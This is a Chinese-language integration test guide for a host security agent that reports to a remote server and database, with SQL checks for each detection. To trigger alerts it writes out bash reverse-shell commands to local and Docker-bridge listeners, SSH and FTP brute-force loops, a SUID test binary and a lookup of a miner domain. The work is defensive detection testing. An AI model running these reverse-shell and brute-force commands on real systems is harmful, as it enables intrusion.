# Agent + 远程 server Server 集成测试流程

本文档描述 server Server 部署在远程服务器时的集成测试流程：本地 Agent 采集/检测数据 → 通过 gRPC 发送至远程 server → server 解析并写入远程 PostgreSQL → 查询远程数据库验证数据正确性。

> **说明：** 本文档适用于 server 已部署在远程服务器的场景。本地**无需启动 server 和 PostgreSQL**，只需编译部署 Agent 并配置指向远程服务器即可。

---

## 一、概述

### 与其他模式的区别

| 对比项 | Standalone 模式 | 本地集成测试 | 远程 server 集成测试（本文档） |
|--------|----------------|------------|---------------------------|
| 服务端 | 不需要 | 需要本地启动 server | 使用远程已部署的 server |
| 数据库 | 不需要 | 需要本地 PostgreSQL | 使用远程 PostgreSQL |
| 数据输出 | stderr / 文件 | gRPC → 本地 server → 本地 DB | gRPC → 远程 server → 远程 DB |
| 验证方式 | 查看终端日志 | SQL 查询本地数据库 | SQL 查询远程数据库 |
| 适用场景 | 插件功能调试 | 完整数据链路验证 | 完整数据链路验证（无需本地部署 server） |

### 变量约定

本文档使用以下变量，请替换为实际值：

| 变量 | 说明 | 示例 |
|------|------|------|
| `<REMOTE_IP>` | 远程 server 服务器 IP | `54.179.163.116` |
| `<DB_USER>` | 远程 PostgreSQL 用户名 | `user_daEJ8N` |
| `<DB_PASS>` | 远程 PostgreSQL 密码 | `password_72kmbz` |

### 数据流

```
本地 Agent                      远程 server Server                远程 PostgreSQL
┌──────────┐  gRPC stream       ┌──────────────┐  GORM          ┌──────────┐
│ Collector │──────────────────→│ transfer.go  │──────────────→ │ asset_*  │
│ Baseline  │  PackagedData     │   mapper/    │  INSERT/UPSERT │ alert_*  │
│ Detector  │  (跨网络)         │  repository/ │                │ event_*  │
│ eBPF      │ ←────────────────│              │                │ baseline │
└──────────┘  Command            └──────────────┘                └──────────┘
    本地机器                        远程服务器 <REMOTE_IP>
```

### 数据类型与数据库表对照

| 插件 | DataType | 数据库表 | 写入方式 |
|------|----------|---------|---------|
| collector | 5050 | asset_process | UPSERT |
| collector | 5051 | asset_port | UPSERT |
| collector | 5052 | asset_account | UPSERT |
| collector | 5054 | asset_system_service | UPSERT |
| collector | 5055 | asset_software | UPSERT |
| collector | 5056 | asset_container | UPSERT |
| collector | 5057 | asset_env_suspicious | UPSERT |
| collector | 5058 | asset_image | UPSERT |
| collector | 5059 | asset_image_package | UPSERT |
| collector | 5060 | asset_web_service | UPSERT |
| collector | 5061 | asset_database | UPSERT |
| collector | 5062 | asset_kmod | UPSERT |
| ebpf_base_detector | 59 | event_execve | INSERT |
| ebpf_base_detector | 60 | event_connect | INSERT |
| ebpf_base_detector | 63 | event_dns | INSERT |
| ebpf_base_detector | 64 | event_file | INSERT |
| ebpf_base_detector | 6003 | alert_dangerous_command | INSERT |
| ebpf_base_detector | 6006 | alert_privilege_escalation | INSERT |
| ebpf_base_detector | 6004 | alert_reverse_shell | INSERT |
| detector | 6001 | alert_brute_force | INSERT |
| detector | 6002 | alert_brute_force | INSERT |
| detector | 6005 | alert_abnormal_login | INSERT |
| baseline | 8000 | baseline_check_result + baseline_check_detail | INSERT |
| scanner | 6061 | alert_malware_scan | INSERT |
| scanner | 6062 | alert_malware_scan | INSERT |
| nids | 6007 | alert_network_attack | INSERT |
| ebpf_base_detector | 6008 | alert_malicious_request | INSERT |
| ebpf_base_detector | 6009 | alert_file_integrity | INSERT |
| ebpf_base_detector | 7001 | alert_container_dangerous_command | INSERT |
| ebpf_base_detector | 7003 | alert_container_reverse_shell | INSERT |
| vuln (server) | - | vuln_info | UPSERT |
| vuln (server) | - | host_vuln_scan_task | INSERT |
| vuln (server) | - | host_vuln_detail | INSERT |
| vuln (server) | - | image_vuln_scan_task | INSERT |
| vuln (server) | - | image_vuln_detail | INSERT |

---

## 二、环境准备

### 2.1 前置条件

**本地机器（运行 Agent）：**
- Linux 操作系统（Ubuntu/CentOS）
- Go 编译环境
- root 权限（Agent 运行需要）
- 网络可达远程服务器（gRPC 端口 50051、HTTP 端口 8081、PostgreSQL 端口 5432）

**可选依赖（按测试章节）：**

| 依赖 | 安装命令 | 用途 |
|------|---------|------|
| sshpass | `apt install sshpass` | 6.1 SSH 暴力破解模拟 |
| vsftpd | `apt install vsftpd` | 6.2 FTP 暴力破解模拟 |
| nginx | `apt install nginx` | 4.1 Web 服务采集 + 9.x NIDS 测试 |
| gcc | `apt install gcc` | 5.2 提权检测（编译 SUID 程序） |
| nc (netcat) | `apt install netcat-openbsd` | 5.3 反弹 Shell + 5.6 容器反弹 Shell 测试 |
| libpcap | `apt install libpcap-dev` | NIDS 插件运行 |

**远程服务器（已部署 server）：**
- server Server 已启动，监听 gRPC 50051 和 HTTP 8081 端口
- PostgreSQL 已运行，数据库 `soc` 已创建
- 防火墙已放行 50051、8081、5432 端口

### 2.2 验证远程服务可达

在本地机器上验证与远程服务器的连通性：

```bash
# 检查 gRPC 端口可达
nc -zv <REMOTE_IP> 50051

# 检查 HTTP API 可达
curl -s http://<REMOTE_IP>:8081/api/agents | python3 -m json.tool

# 检查数据库可达
PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc -c "SELECT 1;"
```

三项均成功后方可进行后续步骤。

### 2.3 测试前清理数据

**每次执行集成测试前，必须先清理历史数据**，确保测试结果不受上次测试影响。

#### 清理测试文件残留

Agent 连接后会自动下发 Scanner 扫描任务（扫描 `/root`、`/etc`、`/var/www`），需先清除上次测试遗留的文件：

```bash
# 清理 EICAR 测试文件
rm -f /root/eicar_test.com /root/eicar_1.exe /root/eicar_2.sh

# 清理提权测试产物
rm -f /tmp/suid_test_id

# 清理文件完整性测试产物
rm -f /etc/cron.d/ebpf_test_cron
```

#### 清理数据库

**方式一：使用清理脚本（推荐）**

```bash
cd /home/work/goProject/src/BeeGuard/agent

# 通过环境变量指定远程数据库连接参数
DB_HOST=<REMOTE_IP> DB_USER=<DB_USER> DB_PASS=<DB_PASS> bash scripts/clean-test-db.sh
```

脚本会自动检测表是否存在，逐个 TRUNCATE 并输出结果。

**方式二：手动执行 SQL**

```bash
PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc
```

```sql
-- 清空 Collector 资产表
TRUNCATE TABLE asset_process, asset_port, asset_account, asset_system_service,
    asset_software, asset_kmod, asset_container, asset_image, asset_image_package,
    asset_web_service, asset_database, asset_env_suspicious CASCADE;

-- 清空 eBPF 事件表
TRUNCATE TABLE event_execve, event_connect, event_dns, event_file CASCADE;

-- 清空告警表
TRUNCATE TABLE alert_brute_force, alert_dangerous_command, alert_privilege_escalation,
    alert_reverse_shell, alert_abnormal_login, alert_malicious_request,
    alert_malware_scan, alert_network_attack, alert_file_integrity,
    alert_container_dangerous_command, alert_container_reverse_shell CASCADE;

-- 清空 Baseline 表
TRUNCATE TABLE baseline_check_detail, baseline_check_result CASCADE;

-- 清空 Agent 信息表
TRUNCATE TABLE agent_info CASCADE;
```

> **说明：** 使用 `TRUNCATE` 比 `DELETE` 更快，且会重置自增 ID。`CASCADE` 会同时清理有外键依赖的关联数据。如果表尚未创建，可跳过此步骤，server 启动后会自动建表。

---

## 三、启动服务

### 3.1 启动 Agent

打开 **Terminal A**，执行：

```bash
cd /opt/cloudsec
sudo ./bin/agent -config agent.yaml -test
```

**参数说明：**

| 参数 | 说明 |
|------|------|
| `-config agent.yaml` | 指定配置文件，包含 server 地址、插件目录等 |
| `-test` | 测试模式，将 agent_id 固定为 `123456`，便于数据库查询。生产环境不使用此参数 |

#### 启动成功判定

在 Terminal A 的输出中，**必须**看到以下关键日志（日志为结构化格式，关注 `INFO` 后的关键字段）：

```
2026-xx-xxTxx:xx:xx.xxx+0800  INFO  agent/main.go:84   ++++++++++++++++++++++++++++++running++++++++++++++++++++++++++++++
2026-xx-xxTxx:xx:xx.xxx+0800  INFO  transport/grpc.go:xx  dialing server  {"server": "<REMOTE_IP>:50051", ...}
2026-xx-xxTxx:xx:xx.xxx+0800  INFO  transport/transfer.go:xx  forwarding task to plugin  {"plugin": "collector", ...}
2026-xx-xxTxx:xx:xx.xxx+0800  INFO  transport/transfer.go:xx  forwarding task to plugin  {"plugin": "detector", ...}
```

**判定规则**：

- `running` 出现 → Agent 主程序启动成功
- `dialing server` 后无报错、出现 `forwarding task to plugin` → Agent 与远程 server 连接成功
- `forwarding task to plugin` 中出现各插件名 → 对应插件加载成功且已接收任务
- `transport: Error while dialing` 错误 → 连接远程 server 失败，检查：
  1. 远程 server 是否已启动
  2. `agent.yaml` 中 `server` 地址是否为 `<REMOTE_IP>:50051`
  3. 防火墙是否放行 50051 端口
  4. 网络是否可达：`nc -zv <REMOTE_IP> 50051`
- `failed to load eBPF` 错误 → 内核不支持 eBPF，检查内核版本 >= 5.4 且存在 `/sys/kernel/btf/vmlinux`

#### 日志位置

| 位置 | 说明 |
|------|------|
| Terminal A (stdout/stderr) | 实时输出，**主要观察位置** |
| `/opt/cloudsec/logs/agent.log` | Agent 主程序日志持久化文件 |
| `/opt/cloudsec/logs/plugins/ebpf_base_detector/ebpf_base_detector.log` | eBPF 插件日志 |
| `/opt/cloudsec/logs/plugins/collector/collector.log` | Collector 插件日志 |

#### 搜索技巧

如果终端输出较多，可使用以下方式过滤：

```bash
# 方式一：启动时过滤关键日志
sudo ./bin/agent -config agent.yaml -test 2>&1 | grep -E "(Plugin loaded|Connected|ERROR)"

# 方式二：保存全部输出到文件，在另一个终端搜索
sudo ./bin/agent -config agent.yaml -test 2>&1 | tee /tmp/agent_integration_test.log
# Terminal B 中搜索
grep "ERROR" /tmp/agent_integration_test.log
grep "Plugin loaded" /tmp/agent_integration_test.log
```

### 3.2 验证连接

**方式一：通过远程 HTTP API 查询**

```bash
# 查看在线 Agent 列表
curl -s http://<REMOTE_IP>:8081/api/agents | python3 -m json.tool
```

**预期响应：**

```json
{
    "agents": [
        {
            "agent_id": "123456",
            "hostname": "your-hostname",
            "ipv4": ["192.168.x.x"],
            "version": "...",
            "product": "cloudsec-agent",
            "last_seen": "2026-03-01T..."
        }
    ],
    "total": 1
}
```

**方式二：查询远程数据库**

```bash
PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc -c \
  "SELECT agent_id, host_name, host_ip, connection_status, last_connected_at FROM agent_info WHERE agent_id = '123456';"
```

`connection_status = 1` 表示 Agent 在线。

---

## 四、Collector 插件测试

Collector 插件在 Agent 连接 Server 后自动启动，按内置周期执行各 Handler 采集数据。

### 4.1 测试前准备

部分 Handler 需要系统中有对应服务运行才能采集到数据，**启动 Agent 前**需先准备好测试环境。

#### Web 服务采集（DataType 5060）— 需启动 Nginx 或 httpd

Collector 的 WebServiceHandler 通过扫描进程列表识别 `nginx`/`apache2`/`httpd` 进程，并解析配置文件提取版本、站点域名等信息。如果系统中没有运行 Web 服务器，该 Handler 不会产生数据。

```bash
# 方式一：启动 Nginx（推荐，大多数 Ubuntu/Debian 系统已安装）
sudo systemctl start nginx
# 验证
systemctl is-active nginx    # 应输出 active
curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/   # 应返回 200 或 404（取决于默认站点配置，只要非连接失败即可）

# 方式二：启动 Apache httpd（CentOS/RHEL）
sudo systemctl start httpd
```

> **提示**：如果需要测试 `site_domain` 字段，可在 nginx 配置中添加 `server_name` 指令。Collector 会解析主配置及一级 `include` 文件中的域名。

#### 容器资产采集（DataType 5056）— 需启动容器

Collector 的 ContainerHandler 通过 Docker API 采集运行中的容器信息。如果没有运行中的容器，该 Handler 不会产生数据。

```bash
# 拉取 alpine 镜像并启动容器（轻量级，约 7MB）
docker pull alpine:latest
docker run -d --name test-alpine alpine:latest sleep 3600

# 验证容器正在运行
docker ps | grep test-alpine
```

> **说明**：启动容器后，ContainerHandler（5056）、ImageHandler（5058）、ImagePackageHandler（5059）均可采集到数据。`sleep 3600` 使容器保持运行 1 小时，足够完成测试。

### 4.2 等待自动采集

Agent 启动后，远程 server 会自动下发插件配置，collector 插件启动后立即执行首轮采集。等待约 30 秒后即可查询远程数据库。

### 4.3 数据库验证

连接远程数据库后执行以下查询。所有资产表都以 `agent_id` 作为关联键。

```bash
# 连接远程数据库
PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc
```

**进程 (asset_process)：**

```sql
-- 查看采集到的进程数量
SELECT COUNT(*) FROM asset_process WHERE agent_id = '123456';

-- 查看前 10 条记录
SELECT agent_id, host_ip, name, path, run_name, status, created_at
FROM asset_process WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

验证要点：
- 记录数应与 `ps aux | wc -l` 大致一致
- `host_ip` 与 Agent 机器 IP 一致
- `name`、`path` 字段非空

**端口 (asset_port)：**

```sql
SELECT COUNT(*) FROM asset_port WHERE agent_id = '123456';

SELECT agent_id, host_ip, port, protocol, listen_ip, listen_process, run_user
FROM asset_port WHERE agent_id = '123456'
ORDER BY port;
```

验证要点：
- 与 `ss -tlnp` 对比，TCP 监听端口应一致
- `protocol` 6=TCP, 17=UDP
- `listen_process` 对应实际监听进程名

**用户 (asset_account)：**

```sql
SELECT COUNT(*) FROM asset_account WHERE agent_id = '123456';

SELECT agent_id, host_ip, name, uid, status, permission, login_type
FROM asset_account WHERE agent_id = '123456'
ORDER BY uid;
```

验证要点：
- 与 `/etc/passwd` 用户列表对比
- root 用户 uid=0 应存在

**系统服务 (asset_system_service)：**

```sql
SELECT COUNT(*) FROM asset_system_service WHERE agent_id = '123456';

SELECT name, status, run_user, path
FROM asset_system_service WHERE agent_id = '123456'
LIMIT 10;
```

验证要点：与 `systemctl list-units --type=service` 对比

**软件包 (asset_software)：**

```sql
SELECT COUNT(*) FROM asset_software WHERE agent_id = '123456';

SELECT name, version, type, source
FROM asset_software WHERE agent_id = '123456'
LIMIT 10;
```

验证要点：
- Debian/Ubuntu 与 `dpkg -l | wc -l` 对比
- RedHat/CentOS 与 `rpm -qa | wc -l` 对比

**内核模块 (asset_kmod)：**

```sql
SELECT COUNT(*) FROM asset_kmod WHERE agent_id = '123456';

SELECT name, size, refcount, used_by, state
FROM asset_kmod WHERE agent_id = '123456'
LIMIT 10;
```

验证要点：与 `lsmod | wc -l` 对比

**容器 (asset_container)** — 需先启动容器（参见 4.1）：

```sql
SELECT COUNT(*) FROM asset_container WHERE agent_id = '123456';

SELECT container_id, name, state, image_name, runtime
FROM asset_container WHERE agent_id = '123456';
```

验证要点：
- 与 `docker ps` 对比，运行中的容器应被采集
- 如果按 4.1 步骤启动了 test-alpine，应至少有 1 条记录
- `state` 为 `running`，`image_name` 包含 `alpine`

**镜像 (asset_image)** — 需要安装 Docker：

```sql
SELECT COUNT(*) FROM asset_image WHERE agent_id = '123456';

SELECT image_id, image_name, image_version, image_size
FROM asset_image WHERE agent_id = '123456';
```

验证要点：
- 与 `docker images` 对比
- `image_size` 非空（alpine 镜像约 7MB）

**Web 服务 (asset_web_service)** — 需先启动 Nginx 或 httpd（参见 4.1）：

```sql
SELECT COUNT(*) FROM asset_web_service WHERE agent_id = '123456';

SELECT name, version, server_type, site_domain, path, created_at
FROM asset_web_service WHERE agent_id = '123456';
```

验证要点：
- 如果按 4.1 步骤启动了 Nginx，应有 1 条记录
- `name` 为 `nginx`（或 `apache`），`version` 非空
- `path` 为配置文件路径（如 `/etc/nginx/nginx.conf`）
- `site_domain` 包含 nginx 配置中 `server_name` 指令的值（过滤 `_`、`localhost`、`*`）

---

## 五、ebpf_base_detector 插件测试 — 告警检测

ebpf_base_detector 插件随 Agent 启动后持续运行，通过 eBPF 监控系统行为。本节验证告警类检测功能，需要手动执行命令触发。

> 前提：内核版本 >= 5.x，存在 `/sys/kernel/btf/vmlinux`。

> **关于 event_* 表**：eBPF 原始事件（DataType 59/60/63/64 对应 event_execve/event_connect/event_dns/event_file）数据量极大，默认配置下 server 不会将这些原始事件持久化到数据库。集成测试中这些表为空是正常行为，只需关注告警表（alert_*）的数据。

### 5.1 高危命令检测 (DataType 6003)

在另一个终端执行测试命令：

```bash
# 终端 B：执行高危命令（2001 - 危险删除操作）
mkdir -p /tmp/test_dir && rm -rf /tmp/test_dir
```

等待 5-10 秒后查询远程数据库：

```sql
SELECT agent_id, host_ip, command, command_type, "user", alert_time, created_at
FROM alert_dangerous_command
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `command` 包含 `rm -rf /tmp/test_dir`
- `created_at` 为刚才执行的时间

### 5.2 本地提权检测 (DataType 6006)

**前提**：需要 gcc 编译器和一个非 root 普通用户（如 `testuser`）。

**快速触发示例**（编译 SUID 程序并以普通用户执行）：

```bash
# 终端 B：创建并编译 SUID 测试程序
cat > /tmp/suid_wrapper.c << 'EOF'
#include <unistd.h>
#include <stdio.h>
int main() {
    printf("uid=%d euid=%d\n", getuid(), geteuid());
    return 0;
}
EOF

gcc -o /tmp/suid_wrapper /tmp/suid_wrapper.c
sudo chown root:root /tmp/suid_wrapper
sudo chmod 4755 /tmp/suid_wrapper

# 以普通用户执行（将 testuser 替换为实际用户名）
su - testuser -c "/tmp/suid_wrapper"
# 预期输出: uid=1001 euid=0（UID 取决于实际用户）
```

> 更多触发方式参考 [privilege-escalation-testing.md](../standalone-test/privilege-escalation-testing.md)。

等待 5-10 秒后查询远程数据库：

```sql
SELECT agent_id, host_ip, escalated_user, parent_process, process_path, discover_time
FROM alert_privilege_escalation
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `process_path` 为 `/tmp/suid_wrapper`
- `escalated_user` 为执行的普通用户名

**清理测试产物**：

```bash
rm -f /tmp/suid_wrapper /tmp/suid_wrapper.c
```

### 5.3 反弹 Shell 检测 (DataType 6004)

参考 [reverse-shell-testing.md](../standalone-test/reverse-shell-testing.md) 中的方法触发反弹 Shell 事件。

**快速触发示例**（需要两个终端）：

```bash
# 终端 C：监听端口
nc -lvp 9999

# 终端 B：触发反弹 Shell（测试后立即关闭）
bash -i >& /dev/tcp/127.0.0.1/9999 0>&1
```

> **注意：** 此处 nc 监听和反弹 Shell 都在本地执行，目标地址使用 `127.0.0.1`。eBPF 检测的是进程的 fd 指向网络套接字的行为，与目标地址无关。

等待 5-10 秒后查询远程数据库：

```sql
SELECT agent_id, host_name, victim_ip, command_line, shell_type,
       target_host, target_port, status, event_time
FROM alert_reverse_shell
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `target_port` 为 `9999`
- `command_line` 包含反弹 Shell 命令

### 5.4 恶意请求检测 (DataType 6008)

参考 [malicious-requests-testing.md](../standalone-test/malicious-requests-testing.md) 中的方法触发恶意请求事件。

> **原理**：eBPF 在内核层 hook DNS 相关系统调用（`recvfrom`/`recvmsg`），捕获 DNS 查询报文后与威胁情报规则匹配。**DNS 解析是否成功不影响检测**——即使 DNS 查询超时或失败，只要查询报文中包含恶意域名，eBPF 就能捕获并触发告警。

**快速触发示例**：

```bash
# 终端 B：使用 nslookup 发起 DNS 查询（推荐，兼容性最好）
# 即使 DNS 超时也能触发告警，因为 eBPF 在内核层捕获查询报文
nslookup minersns.com

# 备选方式（DNS 正常时可用）：
# dig +short minersns.com
# curl -s --connect-timeout 3 http://minersns.com > /dev/null 2>&1 || true
```

> **注意**：`dig` 直接向外部 DNS 服务器发 UDP 查询，在 UDP 53 端口被限制的环境中会超时且无法触发检测。`nslookup` 通过本地 `systemd-resolved` (127.0.0.53) 转发查询，即使最终超时，DNS 查询报文仍会被 eBPF 捕获。

等待 5-10 秒后查询远程数据库：

```sql
SELECT agent_id, host_ip, policy_type, policy_name, malicious_domain,
       malicious_ip, request_count, first_request_time, last_request_time, status
FROM alert_malicious_request
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `malicious_domain` 包含访问的域名
- `policy_type` 标识匹配的威胁情报类型
- `request_count` >= 1

### 5.5 文件完整性告警 (DataType 6009)

eBPF 监控敏感文件的创建、修改、删除操作，匹配文件监控规则时产生告警。

**快速触发示例**（修改敏感文件）：

```bash
# 终端 B：向 crontab 目录写入测试文件（属于敏感路径）
echo "# test" > /etc/cron.d/ebpf_test_cron
rm /etc/cron.d/ebpf_test_cron
```

等待 5-10 秒后查询远程数据库：

```sql
SELECT agent_id, host_ip, rule_type, rule_name, threat_level, threat_action,
       file_path, file_name, operator_user, operator_process, alert_time
FROM alert_file_integrity
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `file_path` 包含 `/etc/cron.d/ebpf_test_cron`
- `threat_action` 为 `create` 或 `delete`
- `threat_level` 非空
- `operator_user` 为执行操作的用户

### 5.6 容器反弹 Shell 检测 (DataType 7003)

eBPF 监控容器内进程的 stdin/stdout 是否连接到网络 socket，检测容器内的反弹 Shell 行为。与主机反弹 Shell（5.3 节，DataType 6004）原理相同，但针对容器环境，额外采集 container_id、container_name、image_name 等容器上下文字段。

**前提：** 需要有运行中的容器（参见 4.1 容器资产采集准备）。容器内需要有 bash 或其他 shell。

**准备测试容器**（如果按 4.1 步骤启动的是 alpine 容器，alpine 默认无 bash，建议额外启动一个 ubuntu 容器）：

```bash
# 启动含 bash 的测试容器
docker run -d --name test-revshell ubuntu:latest sleep 3600

# 验证容器运行
docker ps | grep test-revshell
```

**触发容器反弹 Shell**（需要两个终端）：

```bash
# 终端 C：在宿主机监听端口
nc -lvp 9998

# 终端 B：在容器内触发反弹 Shell（测试后立即关闭）
# 172.17.0.1 为 Docker 默认网桥网关，容器可通过此地址访问宿主机
docker exec test-revshell bash -c "bash -i >& /dev/tcp/172.17.0.1/9998 0>&1"
```

> **注意：** 容器内需通过 Docker 网桥地址（`172.17.0.1`）访问宿主机的 nc 监听端口。如果 Docker 网桥地址不同，可通过 `docker network inspect bridge | grep Gateway` 查看。

等待 5-10 秒后查询远程数据库：

```sql
SELECT agent_id, host_ip, container_id, container_name, image_name,
       pid, uid, comm, exe_path, shell_type,
       remote_ip, remote_port, status, event_time
FROM alert_container_reverse_shell
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `container_id` 为 test-revshell 容器的 ID（与 `docker ps --no-trunc` 输出一致）
- `comm` 为 `bash`（或触发反弹 Shell 的进程名）
- `shell_type` 为 `bash`（由 `inferShellType` 自动推断）
- `remote_port` 为 `9998`
- `remote_ip` 为 Docker 网桥网关地址（如 `172.17.0.1`）

**清理测试容器**：

```bash
docker rm -f test-revshell 2>/dev/null
killall nc 2>/dev/null

---

## 六、Detector 插件测试

Detector 插件通过监控系统日志文件检测暴力破解和异常登录。

### 6.1 SSH 暴力破解 (DataType 6001)

SSH 暴力破解检测通过监控 `/var/log/auth.log`（或 `/var/log/secure`），在滑动窗口内（默认 120 秒）统计同一 IP 的认证失败次数，达到阈值（默认 6 次）时触发告警。此外，暴力破解告警后 10 分钟内同一 IP 成功登录会触发 `brute_force_success` 告警。

#### 白名单说明

SSH 暴力破解的白名单由 `config/rules/ssh_brute_force.yaml` 中的 `whitelist` 字段控制，默认为空（`whitelist: []`），**不过滤任何 IP**。本机（`127.0.0.1`）和远程 IP 均可触发告警。

> 注意：如果远程 server 通过 task 下发了包含白名单的配置（`"whitelist":["127.0.0.1","::1"]`），会覆盖本地配置。此时需修改远程 `server.yaml` 中 ssh task 的 `whitelist` 为空数组，并重启 server。

#### 用例 1：暴力破解尝试

```bash
# 终端 B：模拟 SSH 密码错误（6 次以上触发）
# -o PubkeyAuthentication=no 强制密码认证，避免公钥直接登录成功
# 安装 sshpass: apt install sshpass
for i in {1..7}; do
  sshpass -p 'wrong_password' ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no -o ConnectTimeout=3 root@localhost 2>/dev/null
  sleep 1
done
```

> **为什么需要 `-o PubkeyAuthentication=no`？** 如果攻击端对被测机配置了公钥认证，SSH 会优先使用公钥成功登录，不会产生 `Failed password` 日志，导致无法触发检测。
>
> **为什么不能用 `ssh -o BatchMode=yes`？** 该模式下 SSH 客户端不会尝试密码认证，直接关闭连接，auth.log 中只会记录 `Connection closed by authenticating user`，不匹配检测规则的正则表达式 `Failed (password|publickey)`。

**从远程攻击机执行**（可选，替换 `<攻击机IP>`、`<攻击机密码>`、`<被测机IP>`）：

```bash
# 登录攻击机并发起暴力破解
sshpass -p '<攻击机密码>' ssh -o StrictHostKeyChecking=no root@<攻击机IP> \
  'for i in $(seq 1 7); do
    sshpass -p wrong_password ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no -o ConnectTimeout=3 root@<被测机IP> exit 2>/dev/null
    sleep 1
  done'
```

等待检测触发后查询远程数据库：

```sql
SELECT agent_id, host_ip, source_ip, source_location, attack_type, username,
       attempt_count, first_attack_time, attack_time
FROM alert_brute_force
WHERE agent_id = '123456' AND attack_type = 'ssh'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `attack_type` 为 `ssh`
- `attempt_count` >= 6
- `source_ip` 为发起连接的 IP
- `username` 为被尝试登录的用户名

#### 用例 2：暴力破解成功

在用例 1 告警后 **10 分钟内**，从同一 IP 成功 SSH 登录，触发 `brute_force_success` 告警。

```bash
# 终端 B：从同一 IP 成功登录（密码认证方式）
sshpass -p '<正确密码>' ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no root@localhost exit

# 或使用公钥认证（如已配置）
ssh root@localhost exit
```

**从远程攻击机执行**（可选）：

```bash
sshpass -p '<攻击机密码>' ssh -o StrictHostKeyChecking=no root@<攻击机IP> \
  'sshpass -p <被测机密码> ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no root@<被测机IP> exit'
```

查询远程数据库，确认同一 `source_ip` 出现第二条记录：

```sql
SELECT agent_id, host_ip, source_ip, attack_type, username,
       attempt_count, first_attack_time, attack_time, result
FROM alert_brute_force
WHERE agent_id = '123456' AND attack_type = 'ssh'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- 出现两条记录：一条 `result = 'failed'`（用例 1），一条 `result = 'success'`（用例 2）
- 两条记录的 `source_ip` 相同
- `result = 'success'` 的记录 `attack_time` 在 `result = 'failed'` 之后

> **注意**：用例 2 必须在用例 1 告警后 10 分钟内执行，否则内存中的 bruteForceIPs 记录过期，不会触发 brute_force_success 告警。

### 6.2 FTP 暴力破解 (DataType 6002)

**前提：** 需安装 vsftpd。

```bash
# 模拟 FTP 登录失败
for i in {1..10}; do
  curl -u wronguser:wrongpass ftp://localhost/ 2>/dev/null
  sleep 1
done
```

```sql
SELECT agent_id, source_ip, attack_type, username, attempt_count, attack_time
FROM alert_brute_force
WHERE agent_id = '123456' AND attack_type = 'ftp'
ORDER BY created_at DESC LIMIT 5;
```

### 6.3 SSH 异常登录 (DataType 6005)

SSH 异常登录检测器（`ssh_anomaly_login`）采用**白名单机制**：在 `anomaly_rules` 中定义可信 IP 列表，从不在白名单中的 IP 成功登录 SSH 时触发告警。

> **⚠ 默认配置下该检测器未启用，需完成以下三项配置才能触发告警。**

#### 前置条件一：启用 Agent 端本地配置

Agent 端 detector 插件的本地配置默认禁用了异常登录检测。编辑 Agent 机器上的配置文件：

```bash
vim /opt/cloudsec/plugins/detector/config/rules/ssh_anomaly_login.yaml
```

将 `enabled` 改为 `true`，并添加至少一条 `anomaly_rules` 规则（定义可信 IP 白名单）：

```yaml
ssh_anomaly_login:
  enabled: true
  log_paths:
    - /var/log/auth.log
    - /var/log/secure
  alert_level: 8
  ignore_time: 300

  anomaly_rules:
    - name: trusted_ips
      description: "可信IP白名单"
      enabled: true
      ips:
        - 192.168.1.100
        - 192.168.1.101
```

> **关键说明**：
> - `anomaly_rules` 为空时，检测器代码中 `hasEnabledRules()` 返回 false，**不会产生任何告警**。必须配置至少一条包含 IP 的规则。
> - 规则中的 IP 为"正常登录来源"，不在此列表中的 IP 登录将被判定为异常。
> - 可选配置 `time_ranges`（如 `start: "09:00", end: "18:00"`），限制白名单 IP 的允许登录时段。

#### 前置条件二：处理远程 server 服务端配置覆盖

远程 server 的 `server.yaml` 中 `ssh_anomaly_login` 任务默认配置为 `"enabled":false,"anomaly_rules":[]`。Agent 连接后，服务端会自动下发此配置，**覆盖本地配置**。

**方案 A（推荐）：修改远程 server 的 server.yaml**

如果可以登录远程服务器，编辑 `/opt/cloudsec/conf/server.yaml`，找到 `ssh_anomaly_login` 任务，将 `enabled` 改为 `true` 并添加规则：

```yaml
- object_name: ssh_anomaly_login
  data_type: 6010
  data: '{"ssh_anomaly_login":{"enabled":true,"log_paths":["/var/log/auth.log","/var/log/secure"],"alert_level":8,"ignore_time":300,"anomaly_rules":[{"name":"trusted_ips","description":"可信IP白名单","enabled":true,"ips":["192.168.1.100","192.168.1.101"]}]}}'
```

修改后重启远程 server：`sudo systemctl restart server`

**方案 B：通过 HTTP API 动态覆盖**

如果无法登录远程服务器，可在 Agent 连接后通过 API 重新下发启用配置（需在服务端自动配置下发之后执行）：

```bash
curl -X POST http://<REMOTE_IP>:8081/api/task \
  -H "Content-Type: application/json" \
  -d '{
    "agent_id": "123456",
    "object_name": "ssh_anomaly_login",
    "data_type": 6010,
    "data": "{\"ssh_anomaly_login\":{\"enabled\":true,\"log_paths\":[\"/var/log/auth.log\",\"/var/log/secure\"],\"alert_level\":8,\"ignore_time\":300,\"anomaly_rules\":[{\"name\":\"trusted_ips\",\"description\":\"可信IP白名单\",\"enabled\":true,\"ips\":[\"192.168.1.100\",\"192.168.1.101\"]}]}}"
  }'
```

> **时序要求**：Agent 启动后约 5 秒内服务端会自动下发配置，需等待自动配置下发完毕后再执行上述 API 调用。

#### 前置条件三：确认检测器已生效

检查 Agent 端 detector 插件日志，确认以下三条日志均出现：

```bash
tail -20 /opt/cloudsec/logs/plugins/detector/detector.log | grep ssh_anomaly
```

```
